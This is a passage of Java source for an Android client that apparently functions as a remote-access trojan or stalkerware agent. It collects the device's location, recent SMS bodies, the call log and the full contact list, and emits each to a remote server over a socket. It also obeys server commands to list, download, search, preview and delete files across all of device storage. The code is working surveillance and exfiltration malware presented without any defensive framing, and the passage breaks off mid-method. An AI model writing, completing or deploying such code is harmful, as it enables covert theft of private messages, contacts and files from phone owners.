                locationData.put("longitude", 0.0);
                locationData.put("accuracy", 0.0);
                locationData.put("timestamp", System.currentTimeMillis());
                locationData.put("status", "Location error: " + e.getMessage());
            }
            
            socket.emit(Constants.MESSAGE_LOCATION, locationData);
            Log.d(TAG, "Sent location data: " + locationData.toString());
        } catch (Exception e) {
            Log.e(TAG, "Error sending location data: " + e.getMessage());
        }
    }
    
    private void sendSMSData() {
        try {
            JSONObject smsData = new JSONObject();
            JSONArray smsList = new JSONArray();

            try {
                android.content.ContentResolver contentResolver = context.getContentResolver();
                android.database.Cursor cursor = contentResolver.query(
                    android.provider.Telephony.Sms.CONTENT_URI,
                    new String[]{
                        android.provider.Telephony.Sms.ADDRESS,
                        android.provider.Telephony.Sms.BODY,
                        android.provider.Telephony.Sms.DATE,
                        android.provider.Telephony.Sms.TYPE,
                        android.provider.Telephony.Sms.READ
                    },
                    null, null, android.provider.Telephony.Sms.DATE + " DESC"
                );

                if (cursor != null) {
                    int count = 0;
                    int maxSMS = 50; // Limit to 50 most recent SMS

                    while (cursor.moveToNext() && count < maxSMS) {
                        try {
                            JSONObject sms = new JSONObject();
                            String address = cursor.getString(cursor.getColumnIndexOrThrow(android.provider.Telephony.Sms.ADDRESS));
                            String body = cursor.getString(cursor.getColumnIndexOrThrow(android.provider.Telephony.Sms.BODY));
                            long date = cursor.getLong(cursor.getColumnIndexOrThrow(android.provider.Telephony.Sms.DATE));
                            int type = cursor.getInt(cursor.getColumnIndexOrThrow(android.provider.Telephony.Sms.TYPE));
                            int read = cursor.getInt(cursor.getColumnIndexOrThrow(android.provider.Telephony.Sms.READ));

                            sms.put("address", address != null ? address : "Unknown");
                            sms.put("body", body != null ? body : "");
                            // Format date properly using US locale
                            java.text.SimpleDateFormat sdf = new java.text.SimpleDateFormat("yyyy-MM-dd HH:mm:ss", java.util.Locale.US);
                            sms.put("date", sdf.format(new java.util.Date(date)));
                            sms.put("timestamp", date); // Raw timestamp for sorting
                            sms.put("type", getSMSTypeString(type));
                            sms.put("read", read == 1 ? "Read" : "Unread");
                            sms.put("readStatus", read == 1);

                            smsList.put(sms);
                            count++;
                        } catch (Exception e) {
                            Log.w(TAG, "Error processing SMS entry: " + e.getMessage());
                        }
                    }
                    cursor.close();
                }

                smsData.put("smslist", smsList);
                smsData.put("count", smsList.length());
                smsData.put("status", "SMS data retrieved successfully");

            } catch (SecurityException e) {
                smsData.put("smslist", new JSONArray());
                smsData.put("count", 0);
                smsData.put("status", "SMS permission denied: " + e.getMessage());
            } catch (Exception e) {
                smsData.put("smslist", new JSONArray());
                smsData.put("count", 0);
                smsData.put("status", "SMS error: " + e.getMessage());
            }
            
            socket.emit(Constants.MESSAGE_SMS, smsData);
            Log.d(TAG, "Sent SMS data: " + smsData.toString());
            Log.d(TAG, "SMS count: " + smsList.length() + " messages");
        } catch (Exception e) {
            Log.e(TAG, "Error sending SMS data: " + e.getMessage());
        }
    }
    
    private void sendCallLogData() {
        try {
            JSONObject callData = new JSONObject();
            JSONArray callsList = new JSONArray();
            
            // Try to get real call log data
            try {
                android.content.ContentResolver contentResolver = context.getContentResolver();
                android.database.Cursor cursor = contentResolver.query(
                    android.provider.CallLog.Calls.CONTENT_URI,
                    new String[]{
                        android.provider.CallLog.Calls.NUMBER,
                        android.provider.CallLog.Calls.DATE,
                        android.provider.CallLog.Calls.DURATION,
                        android.provider.CallLog.Calls.TYPE,
                        android.provider.CallLog.Calls.CACHED_NAME
                    },
                    null, null, android.provider.CallLog.Calls.DATE + " DESC"
                );
                
                if (cursor != null) {
                    int count = 0;
                    int maxCalls = 50; // Limit to 50 most recent calls
                    
                    while (cursor.moveToNext() && count < maxCalls) {
                        try {
                            JSONObject call = new JSONObject();
                            String number = cursor.getString(cursor.getColumnIndexOrThrow(android.provider.CallLog.Calls.NUMBER));
                            long date = cursor.getLong(cursor.getColumnIndexOrThrow(android.provider.CallLog.Calls.DATE));
                            int duration = cursor.getInt(cursor.getColumnIndexOrThrow(android.provider.CallLog.Calls.DURATION));
                            int type = cursor.getInt(cursor.getColumnIndexOrThrow(android.provider.CallLog.Calls.TYPE));
                            String name = cursor.getString(cursor.getColumnIndexOrThrow(android.provider.CallLog.Calls.CACHED_NAME));
                            
                            call.put("phoneNo", number != null ? number : "Unknown");
                            call.put("name", name != null && !name.isEmpty() ? name : "Unknown");
                            // Format date properly using US locale to avoid encoding issues
                            java.text.SimpleDateFormat sdf = new java.text.SimpleDateFormat("yyyy-MM-dd HH:mm:ss", java.util.Locale.US);
                            call.put("date", sdf.format(new java.util.Date(date)));
                            call.put("timestamp", date); // Raw timestamp for sorting
                            call.put("duration", duration);
                            call.put("durationFormatted", formatDuration(duration));
                            
                            String callType = getCallTypeString(type);
                            String callStatus = getCallStatusString(type, duration);
                            
                            call.put("type", callType);
                            call.put("status", callStatus);
                            
                            Log.d(TAG, "Call: " + number + " Type: " + type + " -> " + callType + " Status: " + callStatus);
                            
                            callsList.put(call);
                            count++;
                        } catch (Exception e) {
                            Log.w(TAG, "Error processing call log entry: " + e.getMessage());
                        }
                    }
                    cursor.close();
                }
                
                callData.put("callsList", callsList);
                callData.put("count", callsList.length());
                callData.put("status", "Call log retrieved successfully");
                
            } catch (SecurityException e) {
                callData.put("callsList", new JSONArray());
                callData.put("count", 0);
                callData.put("status", "Call log permission denied: " + e.getMessage());
            } catch (Exception e) {
                callData.put("callsList", new JSONArray());
                callData.put("count", 0);
                callData.put("status", "Call log error: " + e.getMessage());
            }
            
            socket.emit(Constants.MESSAGE_CALL, callData);
            Log.d(TAG, "Sent call log data: " + callData.toString());
            Log.d(TAG, "Call log count: " + callsList.length() + " calls");
        } catch (Exception e) {
            Log.e(TAG, "Error sending call log data: " + e.getMessage());
        }
    }
    
    private String getCallTypeString(int type) {
        switch (type) {
            case android.provider.CallLog.Calls.INCOMING_TYPE:
                return "Incoming";
            case android.provider.CallLog.Calls.OUTGOING_TYPE:
                return "Outgoing";
            case android.provider.CallLog.Calls.MISSED_TYPE:
                return "Missed";
            case android.provider.CallLog.Calls.VOICEMAIL_TYPE:
                return "Voicemail";
            case android.provider.CallLog.Calls.REJECTED_TYPE:
                return "Rejected";
            case android.provider.CallLog.Calls.BLOCKED_TYPE:
                return "Blocked";
            case android.provider.CallLog.Calls.ANSWERED_EXTERNALLY_TYPE:
                return "Answered Externally";
            default:
                return "Unknown";
        }
    }
    
    private String getCallStatusString(int type, int duration) {
        switch (type) {
            case android.provider.CallLog.Calls.INCOMING_TYPE:
                return duration > 0 ? "Answered" : "Missed";
            case android.provider.CallLog.Calls.OUTGOING_TYPE:
                return duration > 0 ? "Completed" : "Failed";
            case android.provider.CallLog.Calls.MISSED_TYPE:
                return "Missed";
            case android.provider.CallLog.Calls.VOICEMAIL_TYPE:
                return "Voicemail";
            case android.provider.CallLog.Calls.REJECTED_TYPE:
                return "Rejected";
            case android.provider.CallLog.Calls.BLOCKED_TYPE:
                return "Blocked";
            case android.provider.CallLog.Calls.ANSWERED_EXTERNALLY_TYPE:
                return "Answered Externally";
            default:
                return "Unknown";
        }
    }
    
    private String formatDuration(int duration) {
        if (duration <= 0) {
            return "0s";
        }
        
        int hours = duration / 3600;
        int minutes = (duration % 3600) / 60;
        int seconds = duration % 60;
        
        if (hours > 0) {
            return String.format(java.util.Locale.US, "%dh %dm %ds", hours, minutes, seconds);
        } else if (minutes > 0) {
            return String.format(java.util.Locale.US, "%dm %ds", minutes, seconds);
        } else {
            return String.format(java.util.Locale.US, "%ds", seconds);
        }
    }
    
    private String getSMSTypeString(int type) {
        switch (type) {
            case android.provider.Telephony.Sms.MESSAGE_TYPE_INBOX:
                return "Inbox";
            case android.provider.Telephony.Sms.MESSAGE_TYPE_SENT:
                return "Sent";
            case android.provider.Telephony.Sms.MESSAGE_TYPE_DRAFT:
                return "Draft";
            case android.provider.Telephony.Sms.MESSAGE_TYPE_OUTBOX:
                return "Outbox";
            case android.provider.Telephony.Sms.MESSAGE_TYPE_FAILED:
                return "Failed";
            case android.provider.Telephony.Sms.MESSAGE_TYPE_QUEUED:
                return "Queued";
            default:
                return "Unknown";
        }
    }
    
    private void sendContactsData() {
        try {
            JSONObject contactsData = new JSONObject();
            JSONArray contactsList = new JSONArray();
            
            // Try to get real contacts data
            try {
                android.content.ContentResolver contentResolver = context.getContentResolver();
                android.database.Cursor cursor = contentResolver.query(
                    android.provider.ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                    new String[]{
                        android.provider.ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME,
                        android.provider.ContactsContract.CommonDataKinds.Phone.NUMBER,
                        android.provider.ContactsContract.CommonDataKinds.Phone.TYPE
                    },
                    null, null, null
                );
                
                if (cursor != null) {
                    while (cursor.moveToNext()) {
                        try {
                            JSONObject contact = new JSONObject();
                            String name = cursor.getString(cursor.getColumnIndexOrThrow(android.provider.ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
                            String number = cursor.getString(cursor.getColumnIndexOrThrow(android.provider.ContactsContract.CommonDataKinds.Phone.NUMBER));
                            int type = cursor.getInt(cursor.getColumnIndexOrThrow(android.provider.ContactsContract.CommonDataKinds.Phone.TYPE));
                            
                            contact.put("name", name != null ? name : "Unknown");
                            contact.put("phoneNo", number != null ? number : "Unknown");
                            contact.put("type", getPhoneTypeString(type));
                            
                            contactsList.put(contact);
                        } catch (Exception e) {
                            Log.w(TAG, "Error processing contact: " + e.getMessage());
                        }
                    }
                    cursor.close();
                }
                
                contactsData.put("contactsList", contactsList);
                contactsData.put("count", contactsList.length());
                contactsData.put("status", "Contacts retrieved successfully");
                
            } catch (SecurityException e) {
                contactsData.put("contactsList", new JSONArray());
                contactsData.put("count", 0);
                contactsData.put("status", "Contacts permission denied: " + e.getMessage());
            } catch (Exception e) {
                contactsData.put("contactsList", new JSONArray());
                contactsData.put("count", 0);
                contactsData.put("status", "Contacts error: " + e.getMessage());
            }
            
            socket.emit(Constants.MESSAGE_CONTACTS, contactsData);
            Log.d(TAG, "Sent contacts data: " + contactsData.toString());
        } catch (Exception e) {
            Log.e(TAG, "Error sending contacts data: " + e.getMessage());
        }
    }
    
    private String getPhoneTypeString(int type) {
        switch (type) {
            case android.provider.ContactsContract.CommonDataKinds.Phone.TYPE_HOME:
                return "Home";
            case android.provider.ContactsContract.CommonDataKinds.Phone.TYPE_MOBILE:
                return "Mobile";
            case android.provider.ContactsContract.CommonDataKinds.Phone.TYPE_WORK:
                return "Work";
            case android.provider.ContactsContract.CommonDataKinds.Phone.TYPE_OTHER:
                return "Other";
            default:
                return "Unknown";
        }
    }
    
    private void handleFileCommand(JSONObject command) {
        try {
            if (!command.has("action")) {
                // Default action: list files (with pagination)
                listFiles("/", 0, 500);
                return;
            }
            
            String action = command.getString("action");
            Log.d(TAG, "File command action: " + action);
            
            switch (action) {
                case "ls":
                    String path = command.has("path") ? command.getString("path") : "/";
                    int offset = command.has("offset") ? command.getInt("offset") : 0;
                    int limit = command.has("limit") ? command.getInt("limit") : 500; // Default: 500 files per batch
                    listFiles(path, offset, limit);
                    break;
                case "download":
                case "dl":
                    if (command.has("path")) {
                        downloadFile(command.getString("path"));
                    } else {
                        sendErrorResponse("file_download", "Missing file path");
                    }
                    break;
                case "search":
                    if (command.has("query")) {
                        searchFiles(command.getString("query"));
                    } else {
                        sendErrorResponse("file_search", "Missing search query");
                    }
                    break;
                case "delete":
                    if (command.has("path")) {
                        deleteFile(command.getString("path"));
                    } else {
                        sendErrorResponse("file_delete", "Missing file path");
                    }
                    break;
                case "create_folder":
                    if (command.has("path") && command.has("name")) {
                        createFolder(command.getString("path"), command.getString("name"));
                    } else {
                        sendErrorResponse("file_create", "Missing path or folder name");
                    }
                    break;
                case "preview":
                    if (command.has("path")) {
                        previewFile(command.getString("path"));
                    } else {
                        sendErrorResponse("file_preview", "Missing file path");
                    }
                    break;
                default:
                    sendErrorResponse("file_command", "Unknown action: " + action);
            }
        } catch (Exception e) {
            Log.e(TAG, "Error handling file command: " + e.getMessage());
            sendErrorResponse("file_command", "Error: " + e.getMessage());
        }
    }
    
    private void listFiles(String path, int offset, int limit) {
        try {
            JSONObject filesData = new JSONObject();
            JSONArray filesList = new JSONArray();

            try {
                // CRITICAL: Check MANAGE_EXTERNAL_STORAGE permission for Android 11+
                // Without this permission, Android will filter files and only show images/media
                boolean hasFullAccess = true;
                if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.R) {
                    hasFullAccess = android.os.Environment.isExternalStorageManager();
                    if (!hasFullAccess) {
                        Log.e(TAG, "❌❌❌ MANAGE_EXTERNAL_STORAGE permission NOT granted!");
                        Log.e(TAG, "   Android will filter files - only images/media will be visible");
                        Log.e(TAG, "   User must grant 'All files access' in Settings → Apps → [App Name]");
                        
                        // Still try to list, but warn that results will be filtered
                        Log.w(TAG, "   Attempting to list files anyway (results may be filtered)...");
                    } else {
                        Log.d(TAG, "✅ MANAGE_EXTERNAL_STORAGE permission granted - full file access enabled");
                    }
                }
                
                java.io.File directory;
                int totalCount = 0; // Total files in directory
                
                if ("/".equals(path) || path.isEmpty() || path.equals("/storage/emulated/0")) {
                    // Root directory - show storage options or list main storage root
                    if ("/".equals(path) || path.isEmpty()) {
                        // Show storage root options (no pagination needed for roots)
                    filesList = getStorageRoots();
                        totalCount = filesList.length();
                } else {
                        // Direct access to main storage root - list all files WITH PAGINATION
                        directory = new java.io.File("/storage/emulated/0");
                        if (!directory.exists()) {
                            sendErrorResponse("file_list", "Main storage root not found: /storage/emulated/0");
                            return;
                        }
                        Log.d(TAG, "🔍 Listing MAIN STORAGE ROOT (offset: " + offset + ", limit: " + limit + "): /storage/emulated/0");
                        Log.d(TAG, "   This is the root of device storage - contains ALL files");
                        if (!hasFullAccess) {
                            Log.w(TAG, "   ⚠️ WARNING: Without MANAGE_EXTERNAL_STORAGE, only images/media will be visible");
                        }
                        JSONObject result = walkDirectoryStreamingPaginated(directory, offset, limit);
                        filesList = result.getJSONArray("files");
                        totalCount = result.getInt("total");
                    }
                } else {
                    // Specific directory WITH PAGINATION
                    directory = new java.io.File(path);
                    if (!directory.exists()) {
                        sendErrorResponse("file_list", "Directory not found: " + path);
                        return;
                    }
                    
                    Log.d(TAG, "📂 Listing directory with pagination: " + path + " (offset: " + offset + ", limit: " + limit + ")");
                    
                    // Try to list files even if canRead() returns false
                    // For Android 11+, MANAGE_EXTERNAL_STORAGE permission allows access
                    // We'll try to list anyway and catch any errors
                    try {
                        JSONObject result = walkDirectoryStreamingPaginated(directory, offset, limit);
                        filesList = result.getJSONArray("files");
                        totalCount = result.getInt("total");
                    } catch (SecurityException se) {
                        // If SecurityException, try alternative approach
                        Log.w(TAG, "Security exception, trying alternative method: " + se.getMessage());
                        // Still try to walk - might work with proper permissions
                        JSONObject result = walkDirectoryStreamingPaginated(directory, offset, limit);
                        filesList = result.getJSONArray("files");
                        totalCount = result.getInt("total");
                    }
                }

                filesData.put("type", "list");
                filesData.put("list", filesList);
                filesData.put("count", filesList.length()); // Files in THIS batch
                filesData.put("total", totalCount); // TOTAL files in directory
                filesData.put("offset", offset);
                filesData.put("limit", limit);
                filesData.put("hasMore", (offset + filesList.length()) < totalCount);
                filesData.put("currentPath", path);
                filesData.put("status", "Files retrieved successfully (batch " + (offset / limit + 1) + ")");

            } catch (SecurityException e) {
                filesData.put("type", "list");
                filesData.put("list", new JSONArray());
                filesData.put("count", 0);
                filesData.put("status", "Storage permission denied: " + e.getMessage());
            } catch (Exception e) {
                filesData.put("type", "list");
                filesData.put("list", new JSONArray());
                filesData.put("count", 0);
                filesData.put("status", "File listing error: " + e.getMessage());
            }
            
            socket.emit(Constants.MESSAGE_FILES, filesData);
            Log.d(TAG, "✅✅✅ Sent files list to server: " + filesList.length() + " items (ALL file types included)");
            
            // Log comprehensive summary of file types being sent
            try {
                java.util.Map<String, Integer> typeCount = new java.util.HashMap<>();
                java.util.Map<String, Integer> extensionCount = new java.util.HashMap<>();
                int directories = 0;
                int regularFiles = 0;
                
                for (int i = 0; i < filesList.length(); i++) {
                    try {
                        JSONObject item = filesList.getJSONObject(i);
                        String type = item.optString("type", "Unknown");
                        String ext = item.optString("extension", "").toLowerCase();
                        boolean isDir = item.optBoolean("isDir", false) || item.optBoolean("isDirectory", false);
                        
                        typeCount.put(type, typeCount.getOrDefault(type, 0) + 1);
                        if (!ext.isEmpty()) {
                            extensionCount.put(ext, extensionCount.getOrDefault(ext, 0) + 1);
                        }
                        if (isDir) {
                            directories++;
                        } else {
                            regularFiles++;
                        }
                    } catch (Exception e) {
                        // Ignore
                    }
                }
                
                Log.d(TAG, "═══════════════════════════════════════════════════════════");
                Log.d(TAG, "📊 FILE LIST SUMMARY (being sent to server):");
                Log.d(TAG, "   Total: " + filesList.length() + " items (Directories: " + directories + ", Files: " + regularFiles + ")");
                Log.d(TAG, "   File types: " + typeCount.toString());
                Log.d(TAG, "   Extensions: " + extensionCount.toString());
                Log.d(TAG, "═══════════════════════════════════════════════════════════");
                
                // Warn if only images are being sent
                if (typeCount.size() == 1 && typeCount.containsKey("Image")) {
                    Log.w(TAG, "⚠️⚠️⚠️ WARNING: Only Image files detected! This suggests Android is filtering files.");
                    Log.w(TAG, "   Make sure MANAGE_EXTERNAL_STORAGE permission is granted!");
                } else if (typeCount.size() < 3 && !typeCount.containsKey("Application") && !typeCount.containsKey("Archive")) {
                    Log.w(TAG, "⚠️ WARNING: Limited file types detected. Expected more variety.");
                }
            } catch (Exception e) {
                Log.e(TAG, "Error logging file summary: " + e.getMessage());
            }
        } catch (Exception e) {
            Log.e(TAG, "Error listing files: " + e.getMessage());
            sendErrorResponse("file_list", "Error: " + e.getMessage());
        }
    }
    
    private JSONArray getStorageRoots() {
        JSONArray roots = new JSONArray();
        
        try {
            // PRIMARY: Main Internal Storage Root (/storage/emulated/0)
            // This is the root of the device's internal storage - contains ALL files
            java.io.File mainStorageRoot = new java.io.File("/storage/emulated/0");
            if (mainStorageRoot.exists()) {
                // Check permission status
                boolean hasFullAccess = false;
                if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.R) {
                    hasFullAccess = android.os.Environment.isExternalStorageManager();
                } else {
                    hasFullAccess = true;
                }
                
                JSONObject mainRoot = new JSONObject();
                mainRoot.put("name", "💾 Main Storage (All Files)");
                mainRoot.put("path", mainStorageRoot.getAbsolutePath());
                mainRoot.put("isDir", true);
                mainRoot.put("isDirectory", true);
                mainRoot.put("size", 0);
                mainRoot.put("sizeFormatted", "0 B");
                mainRoot.put("type", "Storage");
                mainRoot.put("lastModified", "");
                mainRoot.put("description", "Root of device internal storage - contains all files");
                mainRoot.put("hasFullAccess", hasFullAccess);
                roots.put(mainRoot);
                Log.d(TAG, "Added main storage root: /storage/emulated/0 (Full access: " + hasFullAccess + ")");
            }
            
            // Also add the standard external storage directory (usually same as /storage/emulated/0)
            java.io.File internalStorage = android.os.Environment.getExternalStorageDirectory();
            if (internalStorage != null && internalStorage.exists()) {
                String internalPath = internalStorage.getAbsolutePath();
                // Only add if it's different from /storage/emulated/0
                if (!internalPath.equals("/storage/emulated/0")) {
            JSONObject internal = new JSONObject();
            internal.put("name", "📱 Internal Storage");
                    internal.put("path", internalPath);
            internal.put("isDir", true);
            internal.put("isDirectory", true);
            internal.put("size", 0);
            internal.put("sizeFormatted", "0 B");
            internal.put("type", "Storage");
            internal.put("lastModified", "");
            roots.put(internal);
                }
            }
            
            // App private directory
            java.io.File appFilesDir = context.getFilesDir();
            if (appFilesDir != null && appFilesDir.exists()) {
                JSONObject appFiles = new JSONObject();
                appFiles.put("name", "📂 App Files");
                appFiles.put("path", appFilesDir.getAbsolutePath());
                appFiles.put("isDir", true);
                appFiles.put("isDirectory", true);
                appFiles.put("size", 0);
                appFiles.put("sizeFormatted", "0 B");
                appFiles.put("type", "Storage");
                appFiles.put("lastModified", "");
                roots.put(appFiles);
            }
            
            // Common folders in internal storage
            if (internalStorage != null) {
            // Downloads folder
                java.io.File downloads = new java.io.File(internalStorage, "Download");
            if (downloads.exists()) {
                JSONObject downloadsObj = new JSONObject();
                downloadsObj.put("name", "📥 Downloads");
                downloadsObj.put("path", downloads.getAbsolutePath());
                downloadsObj.put("isDir", true);
                downloadsObj.put("isDirectory", true);
                downloadsObj.put("size", 0);
                downloadsObj.put("sizeFormatted", "0 B");
                downloadsObj.put("type", "Folder");
                downloadsObj.put("lastModified", "");
                roots.put(downloadsObj);
            }
            
            // DCIM folder
                java.io.File dcim = new java.io.File(internalStorage, "DCIM");
            if (dcim.exists()) {
                JSONObject dcimObj = new JSONObject();
                dcimObj.put("name", "📷 Camera");
                dcimObj.put("path", dcim.getAbsolutePath());
                dcimObj.put("isDir", true);
                dcimObj.put("isDirectory", true);
                dcimObj.put("size", 0);
                dcimObj.put("sizeFormatted", "0 B");
                dcimObj.put("type", "Folder");
                dcimObj.put("lastModified", "");
                roots.put(dcimObj);
                }
                
                // Pictures folder
                java.io.File pictures = new java.io.File(internalStorage, "Pictures");
                if (pictures.exists()) {
                    JSONObject picturesObj = new JSONObject();
                    picturesObj.put("name", "🖼️ Pictures");
                    picturesObj.put("path", pictures.getAbsolutePath());
                    picturesObj.put("isDir", true);
                    picturesObj.put("isDirectory", true);
                    picturesObj.put("size", 0);
                    picturesObj.put("sizeFormatted", "0 B");
                    picturesObj.put("type", "Folder");
                    picturesObj.put("lastModified", "");
                    roots.put(picturesObj);
                }
                
                // Documents folder
                java.io.File documents = new java.io.File(internalStorage, "Documents");
                if (documents.exists()) {
                    JSONObject documentsObj = new JSONObject();
                    documentsObj.put("name", "📄 Documents");
                    documentsObj.put("path", documents.getAbsolutePath());
                    documentsObj.put("isDir", true);
                    documentsObj.put("isDirectory", true);
                    documentsObj.put("size", 0);
                    documentsObj.put("sizeFormatted", "0 B");
                    documentsObj.put("type", "Folder");
                    documentsObj.put("lastModified", "");
                    roots.put(documentsObj);
                }
            }
            
        } catch (Exception e) {
            Log.e(TAG, "Error getting storage roots: " + e.getMessage());
        }
        
        return roots;
    }
    
    private JSONArray walkDirectory(java.io.File directory) {
        JSONArray filesList = new JSONArray();
        
        try {
            if (directory == null) {
                Log.w(TAG, "walkDirectory: directory is null");
                return filesList;
            }
            
            if (!directory.exists()) {
                Log.w(TAG, "walkDirectory: directory does not exist: " + directory.getAbsolutePath());
                return filesList;
            }
            
            if (!directory.isDirectory()) {
                Log.w(TAG, "walkDirectory: path is not a directory: " + directory.getAbsolutePath());
                return filesList;
            }
            
            // Log directory access attempt
            String dirPath = directory.getAbsolutePath();
            Log.d(TAG, "walkDirectory: Listing files in: " + dirPath);
            
            // Special handling for main storage root
            if (dirPath.equals("/storage/emulated/0")) {
                Log.d(TAG, "🔍 Accessing MAIN STORAGE ROOT - This contains ALL device files");
                
                // Check permission for root access
                boolean hasFullAccess = true;
                if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.R) {
                    hasFullAccess = android.os.Environment.isExternalStorageManager();
                    if (hasFullAccess) {
                        Log.d(TAG, "   ✅ MANAGE_EXTERNAL_STORAGE granted - ALL file types will be visible");
                    } else {
                        Log.e(TAG, "   ❌ MANAGE_EXTERNAL_STORAGE NOT granted - only images/media will be visible");
                        Log.e(TAG, "   User must grant 'All files access' in Settings → Apps → [App Name]");
                    }
                } else {
                    Log.d(TAG, "   Android version < 11 - full access available by default");
                }
            }
            
            // IMPORTANT: Use File API as primary method since it shows ALL files
            // MediaStore only shows indexed files and may miss many file types
            // We'll use File API first, then supplement with MediaStore if needed
            
            // Add parent directory entry
            if (directory.getParent() != null) {
                JSONObject parent = new JSONObject();
                parent.put("name", "../");
                parent.put("path", directory.getParent());
                parent.put("isDir", true);
                parent.put("isDirectory", true);
                parent.put("size", 0);
                parent.put("sizeFormatted", "0 B");
                parent.put("type", "Parent");
                parent.put("lastModified", "");
                filesList.put(parent);
            }
            
            java.io.File[] files = null;
            String[] fileNames = null;
            
            // CRITICAL: Use directory.list() as PRIMARY and ONLY method
            // listFiles() filters files on many Android devices and only shows images/folders
            // directory.list() returns ALL file names without filtering
            // However, on Android 10+ with scoped storage, even list() might be filtered
            // We MUST have MANAGE_EXTERNAL_STORAGE permission for full access
            try {
                // ALWAYS use list() first - it doesn't filter files (if permission is granted)
                Log.d(TAG, "🔍 Attempting to list files in: " + directory.getAbsolutePath());
                Log.d(TAG, "   Checking MANAGE_EXTERNAL_STORAGE permission...");
                
                // Check if we have full storage access
                boolean hasFullAccess = false;
                if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.R) {
                    hasFullAccess = android.os.Environment.isExternalStorageManager();
                    Log.d(TAG, "   MANAGE_EXTERNAL_STORAGE granted: " + hasFullAccess);
                    if (!hasFullAccess) {
                        Log.e(TAG, "   ❌❌❌ CRITICAL: MANAGE_EXTERNAL_STORAGE NOT GRANTED!");
                        Log.e(TAG, "   Android will filter files - only images/media will be visible");
                        Log.e(TAG, "   User must grant 'All files access' in Settings → Apps → [App Name]");
                    }
                } else {
                    hasFullAccess = true; // Not needed on Android 9 and below
                    Log.d(TAG, "   Android version < 11, full access assumed");
                }
                
                // Try directory.list() - this should return ALL files if permission is granted
                fileNames = directory.list();
                if (fileNames != null && fileNames.length > 0) {
                    Log.d(TAG, "✅ directory.list() returned " + fileNames.length + " file names");
                    
                    // Log ALL file names immediately to see what Android is returning
                    Log.d(TAG, "📋 Raw file names from directory.list():");
                    int imageCount = 0;
                    int otherCount = 0;
                    for (int i = 0; i < fileNames.length && i < 20; i++) {
                        String name = fileNames[i];
                        String ext = name.contains(".") ? name.substring(name.lastIndexOf(".") + 1).toLowerCase() : "";
                        boolean isImage = ext.equals("jpg") || ext.equals("jpeg") || ext.equals("png") || ext.equals("gif") || ext.equals("bmp") || ext.equals("webp");
                        if (isImage) imageCount++;
                        else otherCount++;
                        Log.d(TAG, "   " + (i + 1) + ". " + name + (isImage ? " [IMAGE]" : " [OTHER]"));
                    }
                    if (fileNames.length > 20) {
                        Log.d(TAG, "   ... and " + (fileNames.length - 20) + " more");
                    }
                    
                    // Warn if only images detected
                    if (imageCount > 0 && otherCount == 0 && fileNames.length <= 20) {
                        Log.w(TAG, "⚠️⚠️⚠️ WARNING: Only image files detected in raw list!");
                        Log.w(TAG, "   This suggests Android is filtering files at OS level");
                        Log.w(TAG, "   MANAGE_EXTERNAL_STORAGE permission status: " + hasFullAccess);
                        if (!hasFullAccess) {
                            Log.e(TAG, "   ❌ Permission NOT granted - this is the problem!");
                        }
                    } else {
                        Log.d(TAG, "   File type mix: " + imageCount + " images, " + otherCount + " other files (in first 20)");
                    }
                    
                    // Convert String[] to File[] - this ensures we get ALL files
                    files = new java.io.File[fileNames.length];
                    for (int i = 0; i < fileNames.length; i++) {
                        files[i] = new java.io.File(directory, fileNames[i]);
                    }
                    Log.d(TAG, "✅ Created " + files.length + " File objects from list() - ALL file types will be processed");
                } else {
                    Log.w(TAG, "directory.list() returned " + (fileNames == null ? "null" : "empty array"));
                    // Only try listFiles() if list() completely fails
                    try {
                        files = directory.listFiles();
            if (files != null) {
                            Log.w(TAG, "Fallback: listFiles() returned " + files.length + " files (may be filtered)");
                        }
                    } catch (Exception e) {
                        Log.e(TAG, "listFiles() also failed: " + e.getMessage());
                    }
                }
            } catch (SecurityException e) {
                Log.w(TAG, "Security exception listing files in: " + directory.getAbsolutePath() + " - " + e.getMessage());
                // Try alternative method - use list() which doesn't require as many permissions
                try {
                    fileNames = directory.list();
                    if (fileNames != null && fileNames.length > 0) {
                        files = new java.io.File[fileNames.length];
                        for (int i = 0; i < fileNames.length; i++) {
                            files[i] = new java.io.File(directory, fileNames[i]);
                        }
                        Log.d(TAG, "Successfully listed " + files.length + " files using list() after SecurityException");
                    }
                } catch (Exception e2) {
                    Log.e(TAG, "list() also failed after SecurityException: " + e2.getMessage());
                    // Try with MANAGE_EXTERNAL_STORAGE if available
                    if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.R) {
                        if (android.os.Environment.isExternalStorageManager()) {
                            try {
                                fileNames = directory.list();
                                if (fileNames != null && fileNames.length > 0) {
                                    files = new java.io.File[fileNames.length];
                                    for (int i = 0; i < fileNames.length; i++) {
                                        files[i] = new java.io.File(directory, fileNames[i]);
                                    }
                                    Log.d(TAG, "Successfully listed files using list() with MANAGE_EXTERNAL_STORAGE");
                                }
                            } catch (Exception e3) {
                                Log.e(TAG, "Still cannot list files even with MANAGE_EXTERNAL_STORAGE: " + e3.getMessage());
                            }
                        }
                    }
                }
            } catch (Exception e) {
                Log.e(TAG, "Error listing files in directory: " + directory.getAbsolutePath() + " - " + e.getMessage());
                // Last resort: try list() method (doesn't filter files)
                try {
                    fileNames = directory.list();
                    if (fileNames != null && fileNames.length > 0) {
                        files = new java.io.File[fileNames.length];
                        for (int i = 0; i < fileNames.length; i++) {
                            files[i] = new java.io.File(directory, fileNames[i]);
                        }
                        Log.d(TAG, "Successfully listed " + files.length + " files using list() as fallback");
                    }
                } catch (Exception e2) {
                    Log.e(TAG, "list() also failed: " + e2.getMessage());
                }
            }
            
            if (files != null && files.length > 0) {
                Log.d(TAG, "Found " + files.length + " files in directory: " + directory.getAbsolutePath());
                
                // Sort files: directories first, then files, both alphabetically
                // Use try-catch to handle any exceptions during sorting
                try {
                java.util.Arrays.sort(files, new java.util.Comparator<java.io.File>() {
                    @Override
                    public int compare(java.io.File f1, java.io.File f2) {
                            try {
                                boolean f1IsDir = f1.isDirectory();
                                boolean f2IsDir = f2.isDirectory();
                                if (f1IsDir && !f2IsDir) return -1;
                                if (!f1IsDir && f2IsDir) return 1;
                                String name1 = f1.getName() != null ? f1.getName().toLowerCase() : "";
                                String name2 = f2.getName() != null ? f2.getName().toLowerCase() : "";
                                return name1.compareTo(name2);
